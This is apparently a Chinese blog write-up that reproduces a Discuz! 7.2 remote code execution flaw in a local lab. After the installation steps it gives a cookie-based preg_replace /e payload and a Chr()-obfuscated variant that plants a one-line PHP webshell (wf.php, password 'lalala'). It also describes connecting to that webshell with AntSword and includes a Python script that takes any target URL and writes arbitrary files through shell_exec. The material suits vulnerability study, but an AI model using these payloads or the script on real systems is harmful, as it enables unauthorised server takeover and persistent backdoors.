## 环境搭建

 ** **准备一台win7装上的phpstudy****

 ** **将discuz7.2源码放进去****

 ** **安装discuz之前，需要先安装center****

 ** **文件夹搭建存放的位置是:****

![1611913451_6013d8eb795ca7e9a9eea.png!small?1611913450302](https://image.3001.net/images/20210129/1611913451_6013d8eb795ca7e9a9eea.png!small?1611913450302)

 ** **解压完成之后更改名称****

 ** **再然后需要把ucenter放到discuz源码下边****

![1611913465_6013d8f986d1da024b4b1.png!small?1611913464237](https://image.3001.net/images/20210129/1611913465_6013d8f986d1da024b4b1.png!small?1611913464237)

![1611913470_6013d8fe3db8bff01b1bd.png!small?1611913469009](https://image.3001.net/images/20210129/1611913470_6013d8fe3db8bff01b1bd.png!small?1611913469009)

 ** **开始安装****

 ** ******

 ** **安装discuz之前****

 ** **首先需要安装ucenter****

 ** **我们先将源码拉进phpstudy根目录下边****

![1611913482_6013d90a98562d41a5ad0.png!small?1611913481346](https://image.3001.net/images/20210129/1611913482_6013d90a98562d41a5ad0.png!small?1611913481346)

  1.  ** **首先安装ucenter****

 ** **http://192.168.0.108/discuz7/ucenter/****

![1611913495_6013d91764efb69b5c6e9.png!small?1611913494145](https://image.3001.net/images/20210129/1611913495_6013d91764efb69b5c6e9.png!small?1611913494145)

![1611913501_6013d91d2be69ea989609.png!small?1611913499956](https://image.3001.net/images/20210129/1611913501_6013d91d2be69ea989609.png!small?1611913499956)

 ** **需要填的只有标红框的****

![1611913511_6013d927bfccea1ef6d32.png!small?1611913510576](https://image.3001.net/images/20210129/1611913511_6013d927bfccea1ef6d32.png!small?1611913510576)

![1611913517_6013d92da04d51def0a9a.png!small?1611913516521](https://image.3001.net/images/20210129/1611913517_6013d92da04d51def0a9a.png!small?1611913516521)

 ** **安装完成之后****

  1.  ** **我们进行安装2****

 ** ******

[
_http://192.168.0.108/discuz7/install/_](http://192.168.0.108/discuz7/install/)  

![1611913536_6013d9409db533e2205c1.png!small?1611913535479](https://image.3001.net/images/20210129/1611913536_6013d9409db533e2205c1.png!small?1611913535479)

 ** **最关键的一步来了****

 ** **需要将ucenter的url修改成http://192.168.0.108/discuz7/ucenter****

 ** **因为我们把ucenter的源码文件放到了discuz7下边了****

![1611913547_6013d94bb59cccd900bb3.png!small?1611913546440](https://image.3001.net/images/20210129/1611913547_6013d94bb59cccd900bb3.png!small?1611913546440)

![1611913554_6013d9526a17d59188748.png!small?1611913553335](https://image.3001.net/images/20210129/1611913554_6013d9526a17d59188748.png!small?1611913553335)

![1611913561_6013d959ce23060de18c0.png!small?1611913560600](https://image.3001.net/images/20210129/1611913561_6013d959ce23060de18c0.png!small?1611913560600)

  

 ** **发现安装成功****

![1611913574_6013d966565665e76958f.png!small?1611913573113](https://image.3001.net/images/20210129/1611913574_6013d966565665e76958f.png!small?1611913573113)

![1611913580_6013d96c4923775690364.png!small?1611913579082](https://image.3001.net/images/20210129/1611913580_6013d96c4923775690364.png!small?1611913579082)

## 漏洞利用

 ** **php版本为3.3.29****

 ** **需要修改配置文件php.ini****

 ** **将request_order = "GP"****

![1611913589_6013d975e0408df26d57d.png!small?1611913588684](https://image.3001.net/images/20210129/1611913589_6013d975e0408df26d57d.png!small?1611913588684)

 ** **漏洞成因以及payload:****

>
>     漏洞成因以及payload:
>     GET /viewthread.php?tid=10&extra=page%3D1 HTTP/1.1 #固定访问格式
>     Host: your-ip:8080
>     Accept-Encoding: gzip, deflate
>     Accept: */*
>     Accept-Language: en
>     User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64;
> x64; Trident/5.0)
>     Cookie: GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui;
> GLOBALS[_DCACHE][smilies][replacearray]=phpinfo(); #代码执行
>     Connection: close
>     首先访问存在漏洞的url
>
>  ****

 ** **首先访问存在漏洞的url****

![1611913640_6013d9a8154cf9ede100d.png!small?1611913639141](https://image.3001.net/images/20210129/1611913640_6013d9a8154cf9ede100d.png!small?1611913639141)

![1611913645_6013d9ad8998acbd980d3.png!small?1611913644331](https://image.3001.net/images/20210129/1611913645_6013d9ad8998acbd980d3.png!small?1611913644331)

 ** **利用我鹏哥发的进行getshell****

![1611913656_6013d9b8b167416f47fd7.png!small?1611913655494](https://image.3001.net/images/20210129/1611913656_6013d9b8b167416f47fd7.png!small?1611913655494)

![1611913661_6013d9bd1773cc01f0bdf.png!small?1611913659848](https://image.3001.net/images/20210129/1611913661_6013d9bd1773cc01f0bdf.png!small?1611913659848)

    
    
    cookie里面的payload如下：
     GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=eval(Chr(102).Chr(112).Chr(117).Chr(116).Chr(115).Chr(40).Chr(102).Chr(111).Chr(112).Chr(101).Chr(110).Chr(40).Chr(39).Chr(119).Chr(102).Chr(46).Chr(112).Chr(104).Chr(112).Chr(39).Chr(44).Chr(39).Chr(119).Chr(39).Chr(41).Chr(44).Chr(39).Chr(60).Chr(63).Chr(112).Chr(104).Chr(112).Chr(32).Chr(64).Chr(101).Chr(118).Chr(97).Chr(108).Chr(40).Chr(36).Chr(95).Chr(80).Chr(79).Chr(83).Chr(84).Chr(91).Chr(108).Chr(97).Chr(108).Chr(97).Chr(108).Chr(97).Chr(93).Chr(41).Chr(63).Chr(62).Chr(39).Chr(41).Chr(59))
    

创建的文件为wf.php，密码为lalala  

 ** ******

 ** **我们去网站根目录查看：****

 ** **发现成功写入一个一句话木马文件****

![1611913717_6013d9f5f1a0747d03c46.png!small?1611913716719](https://image.3001.net/images/20210129/1611913717_6013d9f5f1a0747d03c46.png!small?1611913716719)

![1611913722_6013d9fa1e7e8c909d271.png!small?1611913720949](https://image.3001.net/images/20210129/1611913722_6013d9fa1e7e8c909d271.png!small?1611913720949)

 ** **我们在攻击机器上面进行访问****

 ** **再用蚁剑进行连接****

 ** **成功getshell****

蚁剑上面存在敏感的一些shell信息，我就不发出来了  

## 编写上传poc

    
    
    import requests
    url = input("请输入要检测的网址：")
    
    data = input("请输入要写入的内容:")
    
    file = input("请输入文件的名称：")
    urlexp = "viewthread.php?tid=10&extra=page%3D1"+"&x="+"$id=('echo%20"+data+"%20>%20"+file+"');shell_exec($id);"
    urlexp1 = url+urlexp
    cookie = {"Cookie":"GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=eval($_REQUEST[x]);"}
    def getshell():
        result = requests.get(urlexp1,headers=cookie).status_code
        if result == 200:
            print("写入文件成功")
            print("写入的文件名称为:%s，内容是:%s"%(file,data))
        else:
            print("写入文件失败")
    getshell()
    #http://127.0.0.1:8086/discuz7/
    #
    

****

****验证****

![1611913843_6013da738a67c54729a46.png!small?1611913842320](https://image.3001.net/images/20210129/1611913843_6013da738a67c54729a46.png!small?1611913842320)

 ** **成功写入****

![1611913852_6013da7c51d46f2363035.png!small?1611913851163](https://image.3001.net/images/20210129/1611913852_6013da7c51d46f2363035.png!small?1611913851163)

参考链接：法老的博客  

https://laosec.cn/2021/01/27/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91-Discuz7-2Getshell%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/

